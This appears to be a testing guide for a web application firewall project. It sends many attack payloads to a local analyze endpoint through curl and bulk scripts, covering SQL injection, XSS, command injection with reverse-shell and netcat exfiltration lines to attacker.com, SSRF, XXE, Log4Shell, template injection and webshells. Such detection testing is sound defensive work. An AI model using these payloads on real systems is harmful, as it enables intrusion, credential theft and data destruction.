# DECEPTICON WAF - Attack Testing Guide

This guide provides comprehensive attack payloads for testing and demonstrating the WAF's detection capabilities across all dashboard panels.

## Table of Contents
- [Quick Start](#quick-start)
- [Layer 1: Basic Pattern Matching](#layer-1-basic-pattern-matching)
- [Layer 2: ML-Based Detection](#layer-2-ml-based-detection)
- [Layer 3: Behavioral Analysis](#layer-3-behavioral-analysis)
- [Layer 4: Advanced Protection](#layer-4-advanced-protection)
- [Layer 5: Zero-Day Detection](#layer-5-zero-day-detection)
- [Bulk Testing Scripts](#bulk-testing-scripts)
- [Simulated Metrics](#simulated-metrics)

---

## Quick Start

Base URL: `http://localhost:8080`

Test endpoint:
```bash
curl -X POST "http://localhost:8080/api/waf/analyze" \
  -H "Content-Type: application/json" \
  -d '{"method":"GET","path":"/api/test","payload":"<YOUR_PAYLOAD>"}'
```

---

## Layer 1: Basic Pattern Matching

These attacks trigger the pattern matching engine (first line of defense).

### SQL Injection (SQLI)

```bash
# Classic OR-based injection
curl -X POST "http://localhost:8080/api/waf/analyze" \
  -H "Content-Type: application/json" \
  -d '{"method":"GET","path":"/api/users","payload":"1 OR 1=1--"}'

# UNION-based injection
curl -X POST "http://localhost:8080/api/waf/analyze" \
  -H "Content-Type: application/json" \
  -d '{"method":"GET","path":"/api/users","payload":"1 UNION SELECT username,password FROM users--"}'

# Blind SQL injection
curl -X POST "http://localhost:8080/api/waf/analyze" \
  -H "Content-Type: application/json" \
  -d '{"method":"GET","path":"/api/users","payload":"1 AND SLEEP(5)--"}'

# Stacked queries
curl -X POST "http://localhost:8080/api/waf/analyze" \
  -H "Content-Type: application/json" \
  -d '{"method":"GET","path":"/api/users","payload":"1; DROP TABLE users;--"}'

# Error-based injection
curl -X POST "http://localhost:8080/api/waf/analyze" \
  -H "Content-Type: application/json" \
  -d '{"method":"GET","path":"/api/users","payload":"1 AND EXTRACTVALUE(1,CONCAT(0x7e,version()))--"}'
```

### Cross-Site Scripting (XSS)

```bash
# Basic script tag
curl -X POST "http://localhost:8080/api/waf/analyze" \
  -H "Content-Type: application/json" \
  -d '{"method":"GET","path":"/api/search","payload":"<script>alert(1)</script>"}'

# Event handler XSS
curl -X POST "http://localhost:8080/api/waf/analyze" \
  -H "Content-Type: application/json" \
  -d '{"method":"GET","path":"/api/search","payload":"<img src=x onerror=alert(document.cookie)>"}'

# SVG-based XSS
curl -X POST "http://localhost:8080/api/waf/analyze" \
  -H "Content-Type: application/json" \
  -d '{"method":"GET","path":"/api/search","payload":"<svg onload=alert(1)>"}'

# JavaScript URL
curl -X POST "http://localhost:8080/api/waf/analyze" \
  -H "Content-Type: application/json" \
  -d '{"method":"GET","path":"/api/search","payload":"<a href=javascript:alert(1)>click</a>"}'

# DOM-based XSS
curl -X POST "http://localhost:8080/api/waf/analyze" \
  -H "Content-Type: application/json" \
  -d '{"method":"GET","path":"/api/search","payload":"<body onpageshow=alert(1)>"}'
```

### Remote Code Execution (RCE)

```bash
# Command injection - Linux
curl -X POST "http://localhost:8080/api/waf/analyze" \
  -H "Content-Type: application/json" \
  -d '{"method":"GET","path":"/api/ping","payload":"; cat /etc/passwd"}'

# Command injection - Backticks
curl -X POST "http://localhost:8080/api/waf/analyze" \
  -H "Content-Type: application/json" \
  -d '{"method":"GET","path":"/api/ping","payload":"`whoami`"}'

# Command injection - $() syntax
curl -X POST "http://localhost:8080/api/waf/analyze" \
  -H "Content-Type: application/json" \
  -d '{"method":"GET","path":"/api/ping","payload":"$(id)"}'

# Command injection - Pipe
curl -X POST "http://localhost:8080/api/waf/analyze" \
  -H "Content-Type: application/json" \
  -d '{"method":"GET","path":"/api/ping","payload":"| nc attacker.com 4444 -e /bin/sh"}'

# Python code injection
curl -X POST "http://localhost:8080/api/waf/analyze" \
  -H "Content-Type: application/json" \
  -d '{"method":"GET","path":"/api/eval","payload":"__import__(\"os\").system(\"whoami\")"}'
```

### Server-Side Request Forgery (SSRF)

```bash
# AWS metadata endpoint
curl -X POST "http://localhost:8080/api/waf/analyze" \
  -H "Content-Type: application/json" \
  -d '{"method":"GET","path":"/api/fetch","payload":"http://169.254.169.254/latest/meta-data/"}'

# Internal network scan
curl -X POST "http://localhost:8080/api/waf/analyze" \
  -H "Content-Type: application/json" \
  -d '{"method":"GET","path":"/api/fetch","payload":"http://192.168.1.1/admin"}'

# Localhost bypass
curl -X POST "http://localhost:8080/api/waf/analyze" \
  -H "Content-Type: application/json" \
  -d '{"method":"GET","path":"/api/fetch","payload":"http://127.0.0.1:22"}'

# File protocol
curl -X POST "http://localhost:8080/api/waf/analyze" \
  -H "Content-Type: application/json" \
  -d '{"method":"GET","path":"/api/fetch","payload":"file:///etc/passwd"}'

# Cloud metadata - GCP
curl -X POST "http://localhost:8080/api/waf/analyze" \
  -H "Content-Type: application/json" \
  -d '{"method":"GET","path":"/api/fetch","payload":"http://metadata.google.internal/computeMetadata/v1/"}'
```

---

## Layer 2: ML-Based Detection

These attacks may bypass simple patterns but are caught by ML classification.

### Obfuscated SQL Injection

```bash
# Case variation
curl -X POST "http://localhost:8080/api/waf/analyze" \
  -H "Content-Type: application/json" \
  -d '{"method":"GET","path":"/api/users","payload":"1 oR 1=1--"}'

# Comment insertion
curl -X POST "http://localhost:8080/api/waf/analyze" \
  -H "Content-Type: application/json" \
  -d '{"method":"GET","path":"/api/users","payload":"1/**/UNION/**/SELECT/**/password/**/FROM/**/users"}'

# URL encoding
curl -X POST "http://localhost:8080/api/waf/analyze" \
  -H "Content-Type: application/json" \
  -d '{"method":"GET","path":"/api/users","payload":"1%27%20OR%20%271%27=%271"}'

# Hex encoding
curl -X POST "http://localhost:8080/api/waf/analyze" \
  -H "Content-Type: application/json" \
  -d '{"method":"GET","path":"/api/users","payload":"1 AND 0x313d31"}'
```

### Obfuscated XSS

```bash
# HTML entity encoding
curl -X POST "http://localhost:8080/api/waf/analyze" \
  -H "Content-Type: application/json" \
  -d '{"method":"GET","path":"/api/search","payload":"&lt;script&gt;alert(1)&lt;/script&gt;"}'

# Unicode encoding
curl -X POST "http://localhost:8080/api/waf/analyze" \
  -H "Content-Type: application/json" \
  -d '{"method":"GET","path":"/api/search","payload":"<script>\\u0061lert(1)</script>"}'

# Base64 in eval
curl -X POST "http://localhost:8080/api/waf/analyze" \
  -H "Content-Type: application/json" \
  -d '{"method":"GET","path":"/api/search","payload":"<script>eval(atob(\"YWxlcnQoMSk=\"))</script>"}'

# String concatenation
curl -X POST "http://localhost:8080/api/waf/analyze" \
  -H "Content-Type: application/json" \
  -d '{"method":"GET","path":"/api/search","payload":"<script>al\"+\"ert(1)</script>"}'
```

---

## Layer 3: Behavioral Analysis

These test bot detection, rate limiting, and session anomalies.

### Bot Detection

```bash
# Missing User-Agent (bot indicator)
curl -X POST "http://localhost:8080/api/waf/analyze" \
  -H "Content-Type: application/json" \
  -H "User-Agent: " \
  -d '{"method":"GET","path":"/api/data","headers":{"User-Agent":""}}'

# Known bot User-Agent
curl -X POST "http://localhost:8080/api/waf/analyze" \
  -H "Content-Type: application/json" \
  -d '{"method":"GET","path":"/api/data","headers":{"User-Agent":"python-requests/2.28.0"}}'

# Crawler User-Agent
curl -X POST "http://localhost:8080/api/waf/analyze" \
  -H "Content-Type: application/json" \
  -d '{"method":"GET","path":"/api/data","headers":{"User-Agent":"Googlebot/2.1"}}'
```

### Rate Limiting Test

```powershell
# PowerShell - Rapid requests (triggers rate limiting)
1..100 | ForEach-Object { 
  curl.exe -s -X POST "http://localhost:8080/api/waf/analyze" `
    -H "Content-Type: application/json" `
    -d '{\"method\":\"GET\",\"path\":\"/api/data\",\"payload\":\"test\"}' 
}
```

```bash
# Bash - Rapid requests
for i in {1..100}; do
  curl -s -X POST "http://localhost:8080/api/waf/analyze" \
    -H "Content-Type: application/json" \
    -d '{"method":"GET","path":"/api/data","payload":"test"}'
done
```

### API Abuse Detection

```bash
# Excessive parameter pollution
curl -X POST "http://localhost:8080/api/waf/analyze" \
  -H "Content-Type: application/json" \
  -d '{"method":"GET","path":"/api/search?q=a&q=b&q=c&q=d&q=e&q=f&q=g&q=h&q=i&q=j","payload":"test"}'

# Oversized payload
curl -X POST "http://localhost:8080/api/waf/analyze" \
  -H "Content-Type: application/json" \
  -d '{"method":"POST","path":"/api/upload","payload":"'"$(python -c "print('A'*100000)")"'"}'
```

---

## Layer 4: Advanced Protection

### Path Traversal

```bash
# Basic traversal
curl -X POST "http://localhost:8080/api/waf/analyze" \
  -H "Content-Type: application/json" \
  -d '{"method":"GET","path":"/api/files","payload":"../../../etc/passwd"}'

# Encoded traversal
curl -X POST "http://localhost:8080/api/waf/analyze" \
  -H "Content-Type: application/json" \
  -d '{"method":"GET","path":"/api/files","payload":"..%2f..%2f..%2fetc%2fpasswd"}'

# Double encoding
curl -X POST "http://localhost:8080/api/waf/analyze" \
  -H "Content-Type: application/json" \
  -d '{"method":"GET","path":"/api/files","payload":"..%252f..%252f..%252fetc%252fpasswd"}'

# Null byte injection
curl -X POST "http://localhost:8080/api/waf/analyze" \
  -H "Content-Type: application/json" \
  -d '{"method":"GET","path":"/api/files","payload":"../../../etc/passwd%00.jpg"}'
```

### XML External Entity (XXE)

```bash
# Basic XXE
curl -X POST "http://localhost:8080/api/waf/analyze" \
  -H "Content-Type: application/json" \
  -d '{"method":"POST","path":"/api/xml","payload":"<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>"}'

# Parameter entity XXE
curl -X POST "http://localhost:8080/api/waf/analyze" \
  -H "Content-Type: application/json" \
  -d '{"method":"POST","path":"/api/xml","payload":"<!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"http://attacker.com/evil.dtd\">%xxe;]>"}'
```

### LDAP Injection

```bash
curl -X POST "http://localhost:8080/api/waf/analyze" \
  -H "Content-Type: application/json" \
  -d '{"method":"GET","path":"/api/ldap","payload":"*)(uid=*))(|(uid=*"}'
```

### Template Injection (SSTI)

```bash
# Jinja2 template injection
curl -X POST "http://localhost:8080/api/waf/analyze" \
  -H "Content-Type: application/json" \
  -d '{"method":"GET","path":"/api/template","payload":"{{config.__class__.__init__.__globals__[\"os\"].popen(\"id\").read()}}"}'

# Twig template injection
curl -X POST "http://localhost:8080/api/waf/analyze" \
  -H "Content-Type: application/json" \
  -d '{"method":"GET","path":"/api/template","payload":"{{_self.env.registerUndefinedFilterCallback(\"exec\")}}{{_self.env.getFilter(\"id\")}}"}'
```

### Log4Shell (Log4j)

```bash
curl -X POST "http://localhost:8080/api/waf/analyze" \
  -H "Content-Type: application/json" \
  -d '{"method":"GET","path":"/api/log","payload":"${jndi:ldap://attacker.com/exploit}"}'

# Obfuscated Log4Shell
curl -X POST "http://localhost:8080/api/waf/analyze" \
  -H "Content-Type: application/json" \
  -d '{"method":"GET","path":"/api/log","payload":"${${lower:j}ndi:${lower:l}dap://attacker.com/x}"}'
```

---

## Layer 5: Zero-Day Detection

These trigger the anomaly-based zero-day detection system.

### Novel Attack Patterns

```bash
# Unusual encoding combinations
curl -X POST "http://localhost:8080/api/waf/analyze" \
  -H "Content-Type: application/json" \
  -d '{"method":"GET","path":"/api/data","payload":"\\x53\\x45\\x4c\\x45\\x43\\x54"}'

# Polyglot payload (multiple attack types)
curl -X POST "http://localhost:8080/api/waf/analyze" \
  -H "Content-Type: application/json" \
  -d '{"method":"GET","path":"/api/data","payload":"jaVasCript:/*-/*`/*\\`/*\"/**/(/* */oNcLiCk=alert() )//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e"}'

# Protocol smuggling attempt
curl -X POST "http://localhost:8080/api/waf/analyze" \
  -H "Content-Type: application/json" \
  -d '{"method":"GET","path":"/api/data","payload":"gopher://127.0.0.1:25/_HELO"}'

# Serialization attack pattern
curl -X POST "http://localhost:8080/api/waf/analyze" \
  -H "Content-Type: application/json" \
  -d '{"method":"POST","path":"/api/deserialize","payload":"rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcA=="}'

# GraphQL introspection abuse
curl -X POST "http://localhost:8080/api/waf/analyze" \
  -H "Content-Type: application/json" \
  -d '{"method":"POST","path":"/graphql","payload":"{__schema{types{name,fields{name}}}}"}'
```

### High Entropy Payloads (Anomaly Detection)

```bash
# Encrypted/encoded malware signature
curl -X POST "http://localhost:8080/api/waf/analyze" \
  -H "Content-Type: application/json" \
  -d '{"method":"POST","path":"/api/data","payload":"U2FsdGVkX1+vupppZksvRf5pq5g5XjFRIipRkwB0K1Y="}'
```

---

## Additional Attack Categories (Extended)

### NoSQL Injection

```bash
# MongoDB $gt operator
curl -X POST "http://localhost:8080/api/waf/analyze" \
  -H "Content-Type: application/json" \
  -d '{"method":"GET","path":"/api/users","payload":"{\"$gt\":\"\"}"}'

# MongoDB $ne operator
curl -X POST "http://localhost:8080/api/waf/analyze" \
  -H "Content-Type: application/json" \
  -d '{"method":"GET","path":"/api/users","payload":"{\"$ne\":null}"}'

# MongoDB $where injection
curl -X POST "http://localhost:8080/api/waf/analyze" \
  -H "Content-Type: application/json" \
  -d '{"method":"GET","path":"/api/users","payload":"{\"$where\":\"this.password.length>0\"}"}'

# MongoDB $regex injection
curl -X POST "http://localhost:8080/api/waf/analyze" \
  -H "Content-Type: application/json" \
  -d '{"method":"GET","path":"/api/users","payload":"{\"username\":{\"$regex\":\"admin\"}}"}'

# MongoDB $or injection
curl -X POST "http://localhost:8080/api/waf/analyze" \
  -H "Content-Type: application/json" \
  -d '{"method":"GET","path":"/api/users","payload":"{\"$or\":[{},{\"$regex\":\".*\"}]}"}'
```

### CRLF Injection

```bash
# Header injection via CRLF
curl -X POST "http://localhost:8080/api/waf/analyze" \
  -H "Content-Type: application/json" \
  -d '{"method":"GET","path":"/api/redirect","payload":"http://evil.com%0d%0aSet-Cookie:hacked=true"}'

# X-Injected header
curl -X POST "http://localhost:8080/api/waf/analyze" \
  -H "Content-Type: application/json" \
  -d '{"method":"GET","path":"/api/redirect","payload":"value%0d%0aX-Injected:header"}'

# Response splitting
curl -X POST "http://localhost:8080/api/waf/analyze" \
  -H "Content-Type: application/json" \
  -d '{"method":"GET","path":"/api/redirect","payload":"test%0d%0a%0d%0a<html>injected</html>"}'
```

### Open Redirect Attacks

```bash
# Protocol-relative redirect
curl -X POST "http://localhost:8080/api/waf/analyze" \
  -H "Content-Type: application/json" \
  -d '{"method":"GET","path":"/api/redirect","payload":"//evil.com"}'

# HTTPS redirect
curl -X POST "http://localhost:8080/api/waf/analyze" \
  -H "Content-Type: application/json" \
  -d '{"method":"GET","path":"/api/redirect","payload":"https://evil.com/phishing"}'

# Triple slash bypass
curl -X POST "http://localhost:8080/api/waf/analyze" \
  -H "Content-Type: application/json" \
  -d '{"method":"GET","path":"/api/redirect","payload":"///evil.com"}'

# Encoded redirect
curl -X POST "http://localhost:8080/api/waf/analyze" \
  -H "Content-Type: application/json" \
  -d '{"method":"GET","path":"/api/redirect","payload":"https%3A%2F%2Fevil.com"}'

# Data URI redirect
curl -X POST "http://localhost:8080/api/waf/analyze" \
  -H "Content-Type: application/json" \
  -d '{"method":"GET","path":"/api/redirect","payload":"data:text/html,<script>alert(1)</script>"}'
```

### Host Header Injection

```bash
# Malicious Host header
curl -X POST "http://localhost:8080/api/waf/analyze" \
  -H "Content-Type: application/json" \
  -d '{"method":"GET","path":"/api/password-reset","headers":{"Host":"evil.com"},"payload":"email=victim@test.com"}'

# X-Forwarded-Host injection
curl -X POST "http://localhost:8080/api/waf/analyze" \
  -H "Content-Type: application/json" \
  -d '{"method":"GET","path":"/api/password-reset","headers":{"X-Forwarded-Host":"attacker.com"},"payload":"reset"}'

# Multiple Host headers
curl -X POST "http://localhost:8080/api/waf/analyze" \
  -H "Content-Type: application/json" \
  -d '{"method":"GET","path":"/api/callback","headers":{"Host":"evil.com:443","X-Host":"attacker.com"},"payload":"oauth"}'
```

### Prototype Pollution (JavaScript)

```bash
# __proto__ pollution
curl -X POST "http://localhost:8080/api/waf/analyze" \
  -H "Content-Type: application/json" \
  -d '{"method":"POST","path":"/api/merge","payload":"{\"__proto__\":{\"admin\":true}}"}'

# Constructor prototype
curl -X POST "http://localhost:8080/api/waf/analyze" \
  -H "Content-Type: application/json" \
  -d '{"method":"POST","path":"/api/merge","payload":"{\"constructor\":{\"prototype\":{\"isAdmin\":true}}}"}'

# Nested pollution
curl -X POST "http://localhost:8080/api/waf/analyze" \
  -H "Content-Type: application/json" \
  -d '{"method":"POST","path":"/api/config","payload":"{\"a\":{\"__proto__\":{\"polluted\":\"yes\"}}}"}'
```

### JWT Token Attacks

```bash
# Algorithm None attack
curl -X POST "http://localhost:8080/api/waf/analyze" \
  -H "Content-Type: application/json" \
  -d '{"method":"GET","path":"/api/auth","payload":"eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJhZG1pbiI6dHJ1ZX0."}'

# Invalid signature
curl -X POST "http://localhost:8080/api/waf/analyze" \
  -H "Content-Type: application/json" \
  -d '{"method":"GET","path":"/api/auth","payload":"eyJhbGciOiJIUzI1NiJ9.eyJhZG1pbiI6dHJ1ZX0.INVALID"}'

# Algorithm confusion (RS256 to HS256)
curl -X POST "http://localhost:8080/api/waf/analyze" \
  -H "Content-Type: application/json" \
  -d '{"method":"GET","path":"/api/auth","headers":{"Authorization":"Bearer eyJhbGciOiJIUzI1NiJ9.eyJyb2xlIjoiYWRtaW4ifQ."},"payload":"auth"}'
```

### Deserialization Attacks

```bash
# PHP serialized object
curl -X POST "http://localhost:8080/api/waf/analyze" \
  -H "Content-Type: application/json" \
  -d '{"method":"POST","path":"/api/deserialize","payload":"O:8:\"stdClass\":1:{s:4:\"exec\";s:6:\"whoami\";}"}'

# Java serialized object (Base64)
curl -X POST "http://localhost:8080/api/waf/analyze" \
  -H "Content-Type: application/json" \
  -d '{"method":"POST","path":"/api/deserialize","payload":"rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcA=="}'

# Python pickle (Base64)
curl -X POST "http://localhost:8080/api/waf/analyze" \
  -H "Content-Type: application/json" \
  -d '{"method":"POST","path":"/api/pickle","payload":"Y29zCnN5c3RlbQooU3dob2FtaQp0Ui4="}'

# .NET ViewState
curl -X POST "http://localhost:8080/api/waf/analyze" \
  -H "Content-Type: application/json" \
  -d '{"method":"POST","path":"/api/viewstate","payload":"/wEPDwUKMTIzNDU2Nzg5MA=="}'
```

### Expression Language Injection (EL/OGNL/SpEL)

```bash
# OGNL injection (Struts)
curl -X POST "http://localhost:8080/api/waf/analyze" \
  -H "Content-Type: application/json" \
  -d '{"method":"GET","path":"/api/template","payload":"${(#rt=@java.lang.Runtime@getRuntime())}"}'

# Spring SpEL injection
curl -X POST "http://localhost:8080/api/waf/analyze" \
  -H "Content-Type: application/json" \
  -d '{"method":"GET","path":"/api/template","payload":"#{T(java.lang.Runtime).getRuntime().exec(\"id\")}"}'

# Thymeleaf SSTI
curl -X POST "http://localhost:8080/api/waf/analyze" \
  -H "Content-Type: application/json" \
  -d '{"method":"GET","path":"/api/template","payload":"__${T(java.lang.Runtime).getRuntime().exec(\"id\")}__"}'

# ERB template (Ruby)
curl -X POST "http://localhost:8080/api/waf/analyze" \
  -H "Content-Type: application/json" \
  -d '{"method":"GET","path":"/api/render","payload":"<%= system(\"id\") %>"}'

# Freemarker SSTI
curl -X POST "http://localhost:8080/api/waf/analyze" \
  -H "Content-Type: application/json" \
  -d '{"method":"GET","path":"/api/render","payload":"<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex(\"id\")}"}'
```

### WebShell Upload Attempts

```bash
# PHP webshell
curl -X POST "http://localhost:8080/api/waf/analyze" \
  -H "Content-Type: application/json" \
  -d '{"method":"POST","path":"/api/upload","payload":"<?php system($_GET[\"cmd\"]); ?>"}'

# JSP webshell
curl -X POST "http://localhost:8080/api/waf/analyze" \
  -H "Content-Type: application/json" \
  -d '{"method":"POST","path":"/api/upload","payload":"<% Runtime.getRuntime().exec(request.getParameter(\"cmd\")); %>"}'

# ASP.NET webshell
curl -X POST "http://localhost:8080/api/waf/analyze" \
  -H "Content-Type: application/json" \
  -d '{"method":"POST","path":"/api/upload","payload":"<%@ Page Language=\"C#\" %><%Response.Write(\"pwned\");%>"}'

# Polyglot (GIF + PHP)
curl -X POST "http://localhost:8080/api/waf/analyze" \
  -H "Content-Type: application/json" \
  -d '{"method":"POST","path":"/api/upload","payload":"GIF89a<?php eval($_POST[0]);?>"}'
```

### HTTP Request Smuggling

```bash
# CL.TE smuggling
curl -X POST "http://localhost:8080/api/waf/analyze" \
  -H "Content-Type: application/json" \
  -d '{"method":"POST","path":"/api/data","headers":{"Transfer-Encoding":"chunked","Content-Length":"4"},"payload":"smuggled"}'

# TE.CL smuggling
curl -X POST "http://localhost:8080/api/waf/analyze" \
  -H "Content-Type: application/json" \
  -d '{"method":"POST","path":"/api/data","headers":{"Content-Length":"13","Transfer-Encoding":"chunked"},"payload":"0\r\n\r\nGET /admin"}'

# TE.TE obfuscation
curl -X POST "http://localhost:8080/api/waf/analyze" \
  -H "Content-Type: application/json" \
  -d '{"method":"POST","path":"/api/data","headers":{"Transfer-Encoding":"chunked, identity"},"payload":"attack"}'
```

### GraphQL Attacks

```bash
# Introspection query
curl -X POST "http://localhost:8080/api/waf/analyze" \
  -H "Content-Type: application/json" \
  -d '{"method":"POST","path":"/graphql","payload":"{__schema{types{name,fields{name,args{name}}}}}"}'

# Sensitive data extraction
curl -X POST "http://localhost:8080/api/waf/analyze" \
  -H "Content-Type: application/json" \
  -d '{"method":"POST","path":"/graphql","payload":"query{users{id,password,email,ssn}}"}'

# Mutation abuse
curl -X POST "http://localhost:8080/api/waf/analyze" \
  -H "Content-Type: application/json" \
  -d '{"method":"POST","path":"/graphql","payload":"mutation{deleteAllUsers{success}}"}'

# Batching attack
curl -X POST "http://localhost:8080/api/waf/analyze" \
  -H "Content-Type: application/json" \
  -d '{"method":"POST","path":"/graphql","payload":"[{\"query\":\"mutation{login(user:\\\"a\\\",pass:\\\"1\\\")}\"},{\"query\":\"mutation{login(user:\\\"a\\\",pass:\\\"2\\\")}\"}]"}'

# SQL injection in GraphQL
curl -X POST "http://localhost:8080/api/waf/analyze" \
  -H "Content-Type: application/json" \
  -d '{"method":"POST","path":"/graphql","payload":"{user(id:\"1 OR 1=1\"){name}}"}'
```

### Unicode/Encoding Bypass Attacks

```bash
# Fullwidth Unicode XSS
curl -X POST "http://localhost:8080/api/waf/analyze" \
  -H "Content-Type: application/json" \
  -d '{"method":"GET","path":"/api/search","payload":"＜script＞alert(1)＜/script＞"}'

# Overlong UTF-8 encoding
curl -X POST "http://localhost:8080/api/waf/analyze" \
  -H "Content-Type: application/json" \
  -d '{"method":"GET","path":"/api/data","payload":"%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd"}'

# Unicode normalization bypass
curl -X POST "http://localhost:8080/api/waf/analyze" \
  -H "Content-Type: application/json" \
  -d '{"method":"GET","path":"/api/users","payload":"admin\u0027 OR \u00271\u0027=\u00271"}'

# Double URL encoding
curl -X POST "http://localhost:8080/api/waf/analyze" \
  -H "Content-Type: application/json" \
  -d '{"method":"GET","path":"/api/files","payload":"..%252f..%252f..%252fetc/passwd"}'
```

### Server-Side Include (SSI) Injection

```bash
# Basic SSI
curl -X POST "http://localhost:8080/api/waf/analyze" \
  -H "Content-Type: application/json" \
  -d '{"method":"GET","path":"/api/page","payload":"<!--#exec cmd=\"whoami\"-->"}'

# SSI include
curl -X POST "http://localhost:8080/api/waf/analyze" \
  -H "Content-Type: application/json" \
  -d '{"method":"GET","path":"/api/page","payload":"<!--#include virtual=\"/etc/passwd\"-->"}'
```

### Windows-Specific Attacks

```bash
# Windows command injection
curl -X POST "http://localhost:8080/api/waf/analyze" \
  -H "Content-Type: application/json" \
  -d '{"method":"GET","path":"/api/ping","payload":"& type C:\\Windows\\System32\\config\\SAM"}'

# PowerShell injection
curl -X POST "http://localhost:8080/api/waf/analyze" \
  -H "Content-Type: application/json" \
  -d '{"method":"GET","path":"/api/exec","payload":"powershell -enc BASE64PAYLOAD"}'

# UNC path injection
curl -X POST "http://localhost:8080/api/waf/analyze" \
  -H "Content-Type: application/json" \
  -d '{"method":"GET","path":"/api/files","payload":"\\\\attacker.com\\share\\evil.exe"}'
```

### Cache Poisoning

```bash
# Web cache poisoning via Host
curl -X POST "http://localhost:8080/api/waf/analyze" \
  -H "Content-Type: application/json" \
  -d '{"method":"GET","path":"/api/static","headers":{"Host":"evil.com","X-Forwarded-Host":"attacker.com"},"payload":""}'

# Cache key injection
curl -X POST "http://localhost:8080/api/waf/analyze" \
  -H "Content-Type: application/json" \
  -d '{"method":"GET","path":"/api/resource","headers":{"X-Original-URL":"/admin"},"payload":""}'
```

---

## Bulk Testing Scripts

### PowerShell - Complete Test Suite

```powershell
# Save as test-waf.ps1
$baseUrl = "http://localhost:8080/api/waf/analyze"

$attacks = @(
    # SQLI
    @{name="SQLI-Basic"; payload="1 OR 1=1--"},
    @{name="SQLI-Union"; payload="1 UNION SELECT * FROM users--"},
    @{name="SQLI-Blind"; payload="1 AND SLEEP(5)--"},
    
    # XSS
    @{name="XSS-Script"; payload="<script>alert(1)</script>"},
    @{name="XSS-Event"; payload="<img src=x onerror=alert(1)>"},
    @{name="XSS-SVG"; payload="<svg onload=alert(1)>"},
    
    # RCE
    @{name="RCE-Semicolon"; payload="; cat /etc/passwd"},
    @{name="RCE-Backtick"; payload="``whoami``"},
    @{name="RCE-Dollar"; payload="`$(id)`"},
    
    # SSRF
    @{name="SSRF-AWS"; payload="http://169.254.169.254/latest/meta-data/"},
    @{name="SSRF-Internal"; payload="http://192.168.1.1/admin"},
    @{name="SSRF-File"; payload="file:///etc/passwd"},
    
    # Path Traversal
    @{name="PathTraversal"; payload="../../../etc/passwd"},
    
    # XXE
    @{name="XXE-Basic"; payload="<!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]>"},
    
    # Log4Shell
    @{name="Log4Shell"; payload="`${jndi:ldap://evil.com/x}"}
)

foreach ($attack in $attacks) {
    $body = @{
        method = "GET"
        path = "/api/test"
        payload = $attack.payload
    } | ConvertTo-Json
    
    Write-Host "Testing: $($attack.name)" -ForegroundColor Yellow
    $response = Invoke-RestMethod -Uri $baseUrl -Method POST -Body $body -ContentType "application/json"
    
    if ($response.blocked) {
        Write-Host "  [BLOCKED] $($response.category)" -ForegroundColor Green
    } else {
        Write-Host "  [ALLOWED]" -ForegroundColor Red
    }
}
```

### Bash - Complete Test Suite

```bash
#!/bin/bash
# Save as test-waf.sh

BASE_URL="http://localhost:8080/api/waf/analyze"

declare -A attacks=(
    ["SQLI-Basic"]="1 OR 1=1--"
    ["SQLI-Union"]="1 UNION SELECT * FROM users--"
    ["XSS-Script"]="<script>alert(1)</script>"
    ["XSS-Event"]="<img src=x onerror=alert(1)>"
    ["RCE-Command"]="; cat /etc/passwd"
    ["SSRF-AWS"]="http://169.254.169.254/latest/meta-data/"
    ["PathTraversal"]="../../../etc/passwd"
    ["Log4Shell"]="\${jndi:ldap://evil.com/x}"
)

for name in "${!attacks[@]}"; do
    payload="${attacks[$name]}"
    echo -e "\nTesting: $name"
    
    response=$(curl -s -X POST "$BASE_URL" \
        -H "Content-Type: application/json" \
        -d "{\"method\":\"GET\",\"path\":\"/api/test\",\"payload\":\"$payload\"}")
    
    blocked=$(echo $response | jq -r '.blocked')
    category=$(echo $response | jq -r '.category')
    
    if [ "$blocked" == "true" ]; then
        echo "  [BLOCKED] Category: $category"
    else
        echo "  [ALLOWED]"
    fi
done
```

### Generate Traffic for All Dashboard Panels

```powershell
# Generate comprehensive traffic for all Grafana panels
# Save as generate-dashboard-traffic.ps1

$baseUrl = "http://localhost:8080/api/waf/analyze"

Write-Host "=== Generating WAF Traffic for Dashboard ===" -ForegroundColor Cyan

# SQLI attacks (populates Attack Categories, ML Predictions)
Write-Host "`nSending SQLI attacks..." -ForegroundColor Yellow
1..50 | ForEach-Object {
    $body = '{"method":"GET","path":"/api/users","payload":"SELECT * FROM users WHERE id=1 OR 1=1--"}'
    curl.exe -s -X POST $baseUrl -H "Content-Type: application/json" -d $body > $null
}
Write-Host "  50 SQLI attacks sent" -ForegroundColor Green

# XSS attacks
Write-Host "`nSending XSS attacks..." -ForegroundColor Yellow
1..50 | ForEach-Object {
    $body = '{"method":"GET","path":"/api/search","payload":"<script>alert(document.cookie)</script>"}'
    curl.exe -s -X POST $baseUrl -H "Content-Type: application/json" -d $body > $null
}
Write-Host "  50 XSS attacks sent" -ForegroundColor Green

# RCE attacks
Write-Host "`nSending RCE attacks..." -ForegroundColor Yellow
1..50 | ForEach-Object {
    $body = '{"method":"GET","path":"/api/cmd","payload":"; cat /etc/passwd | nc attacker.com 4444"}'
    curl.exe -s -X POST $baseUrl -H "Content-Type: application/json" -d $body > $null
}
Write-Host "  50 RCE attacks sent" -ForegroundColor Green

# SSRF attacks
Write-Host "`nSending SSRF attacks..." -ForegroundColor Yellow
1..50 | ForEach-Object {
    $body = '{"method":"GET","path":"/api/fetch","payload":"http://169.254.169.254/latest/meta-data/iam/security-credentials/"}'
    curl.exe -s -X POST $baseUrl -H "Content-Type: application/json" -d $body > $null
}
Write-Host "  50 SSRF attacks sent" -ForegroundColor Green

# Normal requests (for accuracy metrics)
Write-Host "`nSending normal requests..." -ForegroundColor Yellow
1..100 | ForEach-Object {
    $body = '{"method":"GET","path":"/api/products","payload":"category=electronics&sort=price"}'
    curl.exe -s -X POST $baseUrl -H "Content-Type: application/json" -d $body > $null
}
Write-Host "  100 normal requests sent" -ForegroundColor Green

Write-Host "`n=== Traffic Generation Complete ===" -ForegroundColor Cyan
